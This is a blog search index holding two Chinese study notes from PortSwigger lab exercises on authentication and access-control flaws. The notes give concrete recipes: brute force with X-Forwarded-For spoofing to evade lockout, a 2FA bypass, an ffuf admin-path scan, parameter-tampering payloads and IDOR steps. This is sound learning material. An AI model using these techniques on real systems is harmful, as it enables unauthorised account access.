<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>身份验证</title>
      <link href="/2025/09/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/"/>
      <url>/2025/09/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="身份验证漏洞"><a href="#身份验证漏洞" class="headerlink" title="身份验证漏洞"></a>身份验证漏洞</h1><h2 id="文章靶场参考出处"><a href="#文章靶场参考出处" class="headerlink" title="文章靶场参考出处"></a>文章靶场参考出处</h2><p><a href="https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/authentication-apprentice/authentication/what-is-the-difference-between-authentication-and-authorization">靶场及出处连接</a></p><h2 id="验证与授权"><a href="#验证与授权" class="headerlink" title="验证与授权"></a>验证与授权</h2><p>身份验证是验证用户是否为其所声称身份的过程。授权包括验证用户是否被允许执行某项操作。</p><p>例如,身份验证决定某人是否试图访问带有用户名的网站<code>Carlos123</code>创建该账户的人确实是同一个人。</p><p>一次<code>Carlos123</code>经过身份验证,其权限决定其授权执行的操作。例如,他们可能被授权访问其他用户的个人信息,或执行删除其他用户账户等操作。  </p><h3 id="简而言之"><a href="#简而言之" class="headerlink" title="简而言之"></a>简而言之</h3><h2 id="认证-确定你是否是声称的用户验证"><a href="#认证-确定你是否是声称的用户验证" class="headerlink" title="认证:确定你是否是声称的用户验证:"></a>认证:确定你是否是声称的用户<br>验证:</h2><hr><h3 id="根据权限表确定你拥有的权限-弱口令攻击"><a href="#根据权限表确定你拥有的权限-弱口令攻击" class="headerlink" title="根据权限表确定你拥有的权限 弱口令攻击"></a>根据权限表确定你拥有的权限 弱口令攻击</h3><p>是指攻击者使用试错系统来判断有效的用户凭据。这些攻击通常使用用户名和密码的字列表进行自动化。自动化此流程,尤其是使用专用工具,可能使攻击者能够高速进行大量登录尝试。</p><p>暴力胁迫并不总是只是对用户名和密码进行完全随机猜测的情形。通过使用基本逻辑或公开知识,攻击者可以微调暴力攻击,从而做出更明智的猜测。这大大提高了此类攻击的效率。依赖基于密码的登录作为唯一身份验证方式的网站,如果未能实施足够的防护,可能会极易受到攻击。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如利用brup suite配置用户名字典和密码字典暴力破解密码</span><br></pre></td></tr></table></figure><h3 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h3><h4 id="登录页面"><a href="#登录页面" class="headerlink" title="登录页面"></a>登录页面</h4><ul><li><p>​<strong>输入有效的用户名 + 错误的密码</strong>​ -&gt; 网站返回： ​<strong>​“密码错误”​</strong>。</p></li><li><p>​<strong>输入无效的用户名 + 任意密码</strong>​ -&gt; 网站返回： ​<strong>​“用户名不存在”​</strong>。</p></li></ul><h4 id="注册页面"><a href="#注册页面" class="headerlink" title="注册页面"></a>注册页面</h4><p>这是您例子中提到的第二个场景。当尝试注册新账户时：</p><ul><li><p>​<strong>输入一个未被占用的用户名</strong>​ -&gt; 网站返回： ​<strong>​“该用户名可用”​</strong>。</p></li><li><p>​<strong>输入一个已被占用的用户名</strong>​ -&gt; 网站返回： ​<strong>​“该用户名已被注册”​</strong>。</p></li></ul><h4 id="密码重置功能"><a href="#密码重置功能" class="headerlink" title="密码重置功能"></a>密码重置功能</h4><ul><li><p>​<strong>输入有效的用户名&#x2F;邮箱</strong>​ -&gt; 网站返回： ​<strong>​“重置密码链接已发送到您的邮箱”​</strong>。</p></li><li><p>​<strong>输入无效的用户名&#x2F;邮箱</strong>​ -&gt; 网站返回： ​<strong>​“该用户不存在”​</strong>。</p></li></ul><h3 id="用户信息的暴露与收集"><a href="#用户信息的暴露与收集" class="headerlink" title="用户信息的暴露与收集"></a>用户信息的暴露与收集</h3><h4 id="浏览网站公开信息，收集已暴露的用户名"><a href="#浏览网站公开信息，收集已暴露的用户名" class="headerlink" title="浏览网站公开信息，收集已暴露的用户名"></a>浏览网站公开信息，收集已暴露的用户名</h4><ul><li><p><strong>论坛帖子&#x2F;博客评论：​</strong>​ 发帖人、评论者的用户名通常会显示。如果网站允许用户使用自定义链接,<code>example.com/user/张三</code></p></li><li><p>​<strong>用户资料页面：​</strong>​ 即使资料内容（如邮箱、电话）被隐藏，但<strong>资料页面的URL</strong>或页面标题本身可能就包含了用户名。例如，访问 <code>example.com/profile/carlos123</code></p></li><li><p>​<strong>作者信息：​</strong>​ 新闻网站、博客文章下方常会标注“作者：admin”。</p></li></ul><h4 id="分析HTTP请求的返回数据包"><a href="#分析HTTP请求的返回数据包" class="headerlink" title="分析HTTP请求的返回数据包"></a>分析HTTP请求的返回数据包</h4><ul><li><p>​<strong>目标：​</strong>​ 从网站服务器返回的数据包中，寻找前端页面不直接显示、但隐藏在代码里的敏感信息。</p></li><li><p>​<strong>具体做法：​</strong>​</p><ul><li><p>使用 ​<strong>Burp Suite</strong>、浏览器开发者工具等拦截网站的各种HTTP响应。</p></li><li><p>​<strong>检查什么：​</strong>​ 仔细查看响应报文（Response）的<strong>正文</strong>​ 和<strong>HTTP头</strong>。</p></li></ul></li><li><p>​<strong>可能泄露的信息：​</strong>​</p><ul><li><p>​<strong>注释掉的代码：​</strong>​ 开发人员有时会在HTML注释中临时写下信息，如 <code>&lt;!-- 管理员邮箱：admin@company.com --&gt;</code>。</p></li><li><p>​<strong>隐藏的输入框：​</strong>​ value值可能包含当前登录用户的邮箱。</p></li><li><p>​<strong>API响应：​</strong>​ 网站通过Ajax加载数据时，返回的JSON数据里可能包含用户信息（如邮箱、ID）。</p></li><li><p>​<strong>HTTP头信息：​</strong>​ 某些服务器配置可能会在报头里泄露服务器管理员邮箱或内部用户名。</p></li></ul></li></ul><p><strong>寻找高优先级用户：​</strong>​</p><ul><li>攻击者的目标是获得最大权限，因此他们会优先寻找<strong>管理员、系统维护人员</strong>等高级别用户的账号。在侦察阶段，他们会特别留意是否有这类用户的邮箱或用户名被泄露（例如，在错误信息或联系页面中出现的IT支持邮箱）。</li><li><code>admin</code>或<code>administrator</code>。</li></ul><h3 id="基于密码的攻击方式与绕过手段"><a href="#基于密码的攻击方式与绕过手段" class="headerlink" title="基于密码的攻击方式与绕过手段"></a>基于密码的攻击方式与绕过手段</h3><h4 id="响应时间的细微差别绕过"><a href="#响应时间的细微差别绕过" class="headerlink" title="响应时间的细微差别绕过"></a>响应时间的细微差别绕过</h4><p>根据brup suite暴力破解,有一些用户名或者是和密码的组合会在响应时间上有差别,这也是最基本弱口令和攻击的判断方式.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在可行的情况下应该先判断用户名</span><br><span class="line">如库中查询到用户名继而会查询密码,如果没有会返回200</span><br><span class="line">所以要将密码设计成将近100个字符的长度,用于扩大响应时间的差距,继而再判断密码</span><br></pre></td></tr></table></figure><h4 id="绕过双重身份验证"><a href="#绕过双重身份验证" class="headerlink" title="绕过双重身份验证"></a>绕过双重身份验证</h4><p>有时,双重身份验证的实现存在缺陷,以至于完全可以绕过它。</p><p>如果用户首次被提示输入密码,然后提示在单独的页面上输入验证码,则在输入验证码之前,该用户实际上处于“登录状态”状态。在这种情况下,值得测试一下,在完成第一个身份验证步骤后,是否可以直接跳转到“仅登录”页面。偶尔,你会发现网站在加载页面之前实际上并未检查是否完成了第二步。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用已知用户url直接绕过即可</span><br><span class="line">https://0ab600c70408d34281a2a22600d60020.web-security-academy.net/my-account?id=carlos </span><br></pre></td></tr></table></figure><h4 id="基于ip的防护"><a href="#基于ip的防护" class="headerlink" title="基于ip的防护"></a>基于ip的防护</h4><p><strong>有些网站可能会对ip进行检查,如果短时间内多次登陆失败会禁止访问</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">解决方案:</span><br><span class="line">在brup内抓包后给http添加</span><br><span class="line">X-Forwarded-For: 192.168.1.1的请求头</span><br><span class="line">对ip地址设计成1~1000的数值递增即可</span><br></pre></td></tr></table></figure><h4 id="有缺陷的防护"><a href="#有缺陷的防护" class="headerlink" title="有缺陷的防护"></a>有缺陷的防护</h4><p><strong>常见方法:</strong></p><ul><li>锁定远程用户在进行过多失败登录时尝试访问的账户</li><li>如果远程用户连续进行过多登录尝试,将屏蔽其IP地址</li></ul><p><strong>解决方案:</strong></p><ul><li><p>使用基于Ip的破解方法</p></li><li><p>每过一段时间插入成功的用户刷新失败计数器</p></li></ul><p><strong>方法:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">添加X-Forwarded-For的http请求头,IP地址设计为随机数</span><br><span class="line">在用户名和密码字典中插入正确的用户名和密码不断刷新计数器</span><br><span class="line">在资源池中设置并发请求数为1</span><br></pre></td></tr></table></figure><p><strong>为什么要把并发数设计为1?</strong></p><p><strong>致命问题</strong>​：</p><ul><li><p>服务器处理请求存在<strong>并行性和乱序性</strong>​</p></li><li><p>当第x个请求（试探用户的最后一次机会的失败）先于第x+1个请求（用于刷新计数器的正常用户成功）被处理时</p></li><li><p>​<strong>IP封锁机制立即激活</strong>，后续所有请求被拒绝</p></li></ul><p>        意思是假设采用原有的资源池设计,假如一次性处理十条请求的话,在这十条请求里面失败三次的请求率先被响应的话立刻封锁ip和账户,后续请求就会失败,这是完全有可能的事,并发请求的状态下,服务器处理用户名确定是否存在,如果存在继续核实用户名密码,而错误的用户名会被服务器检查完是否存在后返回状态码,理论上响应时间比正确用户要快,还有一些其他类似的情况,不过依照理论的响应时间来看,所以要把并发数设计为1.</p><p>        而需要注意到的是这十条请求并非同时进行,由于服务器处理并发请求时存在*<u>线程调度随机性</u>*,<strong>并不能直接确定是哪一条请求被率先执行</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>访问控制漏洞</title>
      <link href="/2025/09/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/09/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="访问控制漏洞"><a href="#访问控制漏洞" class="headerlink" title="访问控制漏洞"></a>访问控制漏洞</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>访问控制是指对谁或哪些人被授权执行操作或访问资源的限制。在Web应用程序的上下文中,访问控制依赖于身份验证和会话管理:</p><ul><li><strong>Authentication</strong>认证确认用户即称自己是谁。</li><li><strong>Session management</strong>会话管理识别同一用户随后发出的HTTP请求。</li><li><strong>Access control</strong>访问控制决定用户是否被允许执行他们试图执行的操作。</li></ul><p>访问控制中断很常见,且通常存在严重的安全漏洞。访问控制的设计与管理是一个复杂而动态的问题,它将业务、组织和法律约束应用于技术实施。访问控制设计决策必须由人类做出,因此出错的可能性很高。</p><p><a href="https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/access-control-apprentice/access-control/what-is-access-control">定义及后续漏洞所参考的原出处</a></p><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>普通用户获取到管理员权限</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><h4 id="无保护功能"><a href="#无保护功能" class="headerlink" title="无保护功能"></a>无保护功能</h4><p>在最基本的情况下,当应用程序对敏感功能不执行任何保护时,就会出现垂直权限的升级。例如,管理功能可能从管理员的欢迎页面链接,但不能从用户的欢迎页面链接。然而,用户可以通过浏览相关管理网址来访问管理功能。</p><p>例如,一个网站可能以以下网址托管敏感功能:</p><p><code>https://insecure-website.com/admin</code></p><p>任何用户都可以访问此功能,而不仅仅是在用户界面中具有该功能链接的管理员用户。在某些情况下,管理网址可能会在其他地点被披露,例如<code>robots.txt</code>文件:</p><p><code>https://insecure-website.com/robots.txt</code></p><p>即使网址未在任何地方被披露,攻击者也可能能够使用文字列表来暴力控制敏感功能的位置。</p><h5 id="文字列表的暴力破解"><a href="#文字列表的暴力破解" class="headerlink" title="文字列表的暴力破解"></a>文字列表的暴力破解</h5><h6 id="前提准备-专门应对的字典"><a href="#前提准备-专门应对的字典" class="headerlink" title="前提准备-&gt;专门应对的字典"></a>前提准备-&gt;专门应对的字典</h6><p>下面是一些常用的字典的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/admin</span><br><span class="line">/administrator</span><br><span class="line">/manager</span><br><span class="line">/console</span><br><span class="line">/backoffice</span><br><span class="line">/cpanel</span><br><span class="line">/controlpanel</span><br><span class="line">/dashboard</span><br><span class="line">/login</span><br><span class="line">/sysadmin</span><br><span class="line">/root</span><br><span class="line">/secret</span><br><span class="line">/internal</span><br><span class="line">/legacy</span><br></pre></td></tr></table></figure><h6 id="FFUF工具的使用"><a href="#FFUF工具的使用" class="headerlink" title="FFUF工具的使用"></a>FFUF工具的使用</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 基础探测（过滤403/404）</span><br><span class="line">ffuf -w admin_paths.txt -u https://target.com/FUZZ \</span><br><span class="line">     -fc 403,404 \</span><br><span class="line">     -t 50</span><br><span class="line"></span><br><span class="line"># 高级参数（带扩展名探测）</span><br><span class="line">ffuf -w admin_paths.txt -u https://target.com/FUZZ.php \</span><br><span class="line">     -mc 200,302 \</span><br><span class="line">     -H &quot;X-Forwarded-For: 127.0.0.1&quot;</span><br></pre></td></tr></table></figure><h6 id="brup-suite配置"><a href="#brup-suite配置" class="headerlink" title="brup suite配置"></a>brup suite配置</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 发送任意GET请求到Intruder</span><br><span class="line">2. 设置攻击类型：**Sniper**</span><br><span class="line">3. 攻击位置：路径末尾 `GET /FUZZ HTTP/1.1`</span><br><span class="line">4. Payload类型：**Simple list**</span><br><span class="line">5. 加载字典文件</span><br><span class="line">6. 添加Grep Match规则：</span><br><span class="line">   - `Location: admin`</span><br><span class="line">   - `Admin Panel`</span><br><span class="line">   - `name=&quot;admin_password&quot;`</span><br></pre></td></tr></table></figure><h6 id="关注点"><a href="#关注点" class="headerlink" title="关注点"></a>关注点</h6><table><thead><tr><th>响应特征</th><th>可能的管理后台</th></tr></thead><tbody><tr><td>302重定向</td><td>&#x2F;admin&#x2F;login</td></tr><tr><td>登录表单</td><td><code>&lt;input type=&quot;password</code></td></tr><tr><td>特殊Cookie</td><td><code>admin_session=...</code></td></tr><tr><td>框架特征</td><td><code>Powered by Drupal</code></td></tr></tbody></table><h5 id="无保护功能-持续"><a href="#无保护功能-持续" class="headerlink" title="无保护功能 - 持续"></a>无保护功能 - 持续</h5><p>在某些情况下,通过提供一个不太可预测的网址来隐藏敏感功能。这是所谓“默默无闻的安全”的一个例子。然而,隐藏敏感功能并不能提供有效的访问控制,因为用户可能会通过多种方式发现混淆的网址。</p><p>设想一个在以下 URL 下托管管理函数的应用程序:</p><p><code>https://insecure-website.com/administrator-panel-yb556</code></p><p>攻击者可能不会直接猜到这一点。然而,该应用程序仍可能将网址泄露给用户。该网址可能在 JavaScript 中披露,该界面根据用户的角色构建用户界面:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line">var isAdmin = false;</span><br><span class="line"> if (isAdmin) &#123; ... var adminPanelTag = document.createElement(&#x27;a&#x27;); adminPanelTag.setAttribute(&#x27;href&#x27;, &#x27;https://insecure-website.com/administrator-panel-yb556&#x27;); </span><br><span class="line">adminPanelTag.innerText = &#x27;Admin panel&#x27;; ... &#125; </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果用户是管理员,此脚本会添加指向用户用户界面的链接。然而,包含该URL的脚本对所有用户都可见,无论其角色如何。</p><h6 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var isAdmin = false;</span><br><span class="line">if (isAdmin) &#123;</span><br><span class="line">   var topLinksTag = document.getElementsByClassName(&quot;top-links&quot;)[0];</span><br><span class="line">   var adminPanelTag = document.createElement(&#x27;a&#x27;);</span><br><span class="line">   adminPanelTag.setAttribute(&#x27;href&#x27;, &#x27;/admin-av8xy4&#x27;);</span><br><span class="line">   adminPanelTag.innerText = &#x27;Admin panel&#x27;;</span><br><span class="line">   topLinksTag.append(adminPanelTag);</span><br><span class="line">   var pTag = document.createElement(&#x27;p&#x27;);</span><br><span class="line">   pTag.innerText = &#x27;|&#x27;;</span><br><span class="line">   topLinksTag.appendChild(pTag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">声明一个变量isAdmin，并设置为false。</span><br><span class="line">如果isAdmin为true，则执行以下操作：</span><br><span class="line"></span><br><span class="line">a. 获取类名为&quot;top-links&quot;的第一个元素（假设这是一个容器，用于放置顶部链接）。</span><br><span class="line"></span><br><span class="line">b. 创建一个新的&lt;a&gt;元素（管理员面板链接）。</span><br><span class="line"></span><br><span class="line">c. 设置这个链接的href属性为&quot;/admin-av8xy4&quot;（这是一个特定的管理员面板路径）。</span><br><span class="line"></span><br><span class="line">d. 设置链接的文本为&quot;Admin panel&quot;。</span><br><span class="line"></span><br><span class="line">e. 将这个链接添加到topLinksTag元素的末尾。</span><br><span class="line"></span><br><span class="line">f. 创建一个&lt;p&gt;元素，用于显示一个竖线分隔符（|）。</span><br><span class="line"></span><br><span class="line">g. 将这个分隔符也添加到topLinksTag元素的末尾。</span><br></pre></td></tr></table></figure><p><strong>虽然管理员页面的路径是复杂的字符串,可是校验的script代码暴露了管理员页面的路径</strong></p><h4 id="基于参数的访问控制方法"><a href="#基于参数的访问控制方法" class="headerlink" title="基于参数的访问控制方法"></a>基于参数的访问控制方法</h4><p>一些应用程序会确定用户在登录时的访问权限或角色,然后将此信息存储在用户可控制的位置。这可能是:</p><ul><li>一个隐藏的领域。</li><li>cooike。</li><li>预设查询字符串参数。</li></ul><p>申请根据所提交的价值做出访问控制决策。例如:</p><p><code>https://insecure-website.com/login/home.jsp?admin=true https://insecure-website.com/login/home.jsp?role=1</code></p><p>这种方法缺乏安全感,因为用户可以修改他们未经授权的值和访问功能,例如管理功能。</p><h5 id="brup-suite配置-1"><a href="#brup-suite配置-1" class="headerlink" title="brup suite配置"></a>brup suite配置</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">由于是通过参数方式检验管理员权限</span><br><span class="line">例如:</span><br><span class="line">admin=true</span><br><span class="line">此时可以修改报文中的admin=false为admin=true进行越权</span><br><span class="line">要注意的是,管理员的每一个操作都会检验权限,所以每一步在brup suite配置下抓包进行</span><br></pre></td></tr></table></figure><h5 id="入侵步骤"><a href="#入侵步骤" class="headerlink" title="入侵步骤"></a>入侵步骤</h5><h6 id="用Burp-Suite拦截请求，查找以下特征参数："><a href="#用Burp-Suite拦截请求，查找以下特征参数：" class="headerlink" title="用Burp Suite拦截请求，查找以下特征参数："></a>用Burp Suite拦截请求，查找以下特征参数：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /dashboard HTTP/1.1</span><br><span class="line">Cookie: role=user; admin=false</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /update_profile HTTP/1.1</span><br><span class="line">...</span><br><span class="line">admin=0&amp;privilege=1</span><br><span class="line"></span><br><span class="line">&lt;!-- 隐藏表单 --&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;isAdmin&quot; value=&quot;0&quot;&gt;</span><br></pre></td></tr></table></figure><p>​<strong>重点关注这些关键词</strong>​：</p><ul><li><p><code>admin</code>, <code>role</code>, <code>access_level</code></p></li><li><p><code>privilege</code>, <code>is_staff</code>, <code>is_superuser</code></p></li><li><p><code>auth</code>, <code>authorized</code>, <code>permission</code></p></li></ul><h6 id="参数篡改测试"><a href="#参数篡改测试" class="headerlink" title="参数篡改测试"></a>参数篡改测试</h6><table><thead><tr><th>参数类型</th><th>原始值</th><th>测试值</th><th>预期效果</th></tr></thead><tbody><tr><td>​<strong>布尔型</strong>​</td><td><code>admin=false</code></td><td><code>admin=true</code></td><td>开启管理员功能</td></tr><tr><td>​<strong>数字型</strong>​</td><td><code>role=1</code></td><td><code>role=0</code>或<code>role=9</code></td><td>切换权限等级</td></tr><tr><td>​<strong>字符型</strong>​</td><td><code>type=user</code></td><td><code>type=admin</code></td><td>提升权限组</td></tr><tr><td>​<strong>二进制</strong>​</td><td><code>access=0001</code></td><td><code>access=1111</code></td><td>开启所有权限</td></tr></tbody></table><h6 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h6><p>​参数污染​：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?role=user&amp;role=admin</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​JSON劫持​：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;&quot;user&quot;:&quot;normal&quot;, &quot;isAdmin&quot;:false&#125;</span><br><span class="line">改为→</span><br><span class="line">&#123;&quot;user&quot;:&quot;normal&quot;, &quot;isAdmin&quot;:true&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​数据类型转换​：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">admin=1   # 原始</span><br><span class="line">admin=on   # 测试</span><br><span class="line">admin=yes</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​空值绕过​：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">privilege=   # 空值</span><br><span class="line">role=undefined</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="水平越权和权限提升"><a href="#水平越权和权限提升" class="headerlink" title="水平越权和权限提升"></a>水平越权和权限提升</h2><hr><p>如果用户能够访问属于其他用户的资源,而非他们自己的此类资源,就会发生横向权限升级。例如,如果员工可以访问其他员工以及他们自己的记录,那么这就是横向权限的升级。</p><p>水平权限升级攻击可能使用类似类型的利用方式来实现垂直权限升级。例如,用户可能会使用以下网址访问自己的账户页面:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/myaccount?id=123</span><br></pre></td></tr></table></figure><p>如果攻击者修改<code>id</code>对其他用户而言,参数值可能会访问其他用户的账户页面以及相关数据和功能。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>在某些应用程序中,可利用的参数没有可预测的值。例如,应用程序可能使用全局唯一标识符(GUID)来识别用户,而不是增加数量。这可能会阻止攻击者猜测或预测其他用户的标识符。然而,在用户被引用的应用程序(如用户消息或评论)中,可能会披露属于其他用户的GUID。</p><h3 id="简而言之-漏洞原理"><a href="#简而言之-漏洞原理" class="headerlink" title="简而言之-漏洞原理"></a>简而言之-漏洞原理</h3><p>​直接对象引用​：系统使用暴露的标识符（如用户ID）定位资源​缺乏权限验证​：未检查请求者是否拥有该资源的访问权限</p><h3 id="基础案例-操作"><a href="#基础案例-操作" class="headerlink" title="基础案例&#x2F;操作"></a>基础案例&#x2F;操作</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GUID</span><br><span class="line">1.可以访问目标用户的资源通过抓包查看是否携带用户的id</span><br><span class="line">2.登录自己的账号,抓包查看报文中id字段,修改为目标用户即可</span><br></pre></td></tr></table></figure><p>但这是没有任何防护的靶场,检测是否有防护如下文</p><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 当ID为不可预测的GUID时：</span><br><span class="line"># 方法1：收集泄露的GUID（评论区/消息系统）</span><br><span class="line"># 方法2：测试可遍历性（即使GUID也应验证权限）</span><br><span class="line">GET /documents?id=7e4efc5b-8d1a-41a3-a8d7-720b216e7319</span><br><span class="line"></span><br><span class="line"># 检测响应：</span><br><span class="line"># - 200 OK + 他人数据 → 漏洞存在</span><br><span class="line"># - 403 Forbidden → 有基础防护</span><br></pre></td></tr></table></figure><p>如果有403代表防护</p><hr><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>通常,横向权限升级攻击可以通过牺牲更优越的用户来转变为垂直权限升级。例如,横向升级可能允许攻击者重置或捕获属于其他用户的密码。如果攻击者针对管理员用户并入侵其账户,则他们可以获取管理权限,从而执行垂直权限升级。</p><p>攻击者可能能够使用已描述的参数篡改技术访问其他用户的账户页面,以实现横向权限升级:</p><p><code>https://insecure-website.com/myaccount?id=456</code></p><p>如果目标用户是应用程序管理员,则攻击者将访问管理账户页面。本页面可能会披露管理员的密码,或提供更改密码的手段,或直接提供对特权功能的访问权限。</p><h3 id="案例-用户ID通过请求参数进行密码泄露"><a href="#案例-用户ID通过请求参数进行密码泄露" class="headerlink" title="案例-用户ID通过请求参数进行密码泄露"></a>案例-用户ID通过请求参数进行密码泄露</h3><pre><code>用户登录抓包-&gt;修改id=administrator-&gt;查看预输入的密码(查看源代码)-&gt;登录管理员账户</code></pre><p><strong>!!!administrator</strong>:没有人会想到该死的id用13个字符.</p><h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><h5 id="发现IDOR漏洞"><a href="#发现IDOR漏洞" class="headerlink" title="发现IDOR漏洞"></a>发现IDOR漏洞</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">登录你的普通账户（如用户ID=100）</span><br><span class="line"></span><br><span class="line">用Burp Suite捕获查看个人资料的请求：</span><br><span class="line">          GET /profile?id=100 HTTP/1.1</span><br><span class="line">          Cookie: session=your_cookie</span><br><span class="line"></span><br><span class="line">修改ID值发送给其他用户（如ID=101）：</span><br><span class="line">       - GET /profile?id=100</span><br><span class="line">       + GET /profile?id=101</span><br></pre></td></tr></table></figure><p>如果返回他人资料 → ​<strong>存在水平越权！​</strong></p><h5 id="寻找管理员账户"><a href="#寻找管理员账户" class="headerlink" title="寻找管理员账户"></a>寻找管理员账户</h5><p>方法</p><p>–​ID递增扫描​</p><p>用Burp 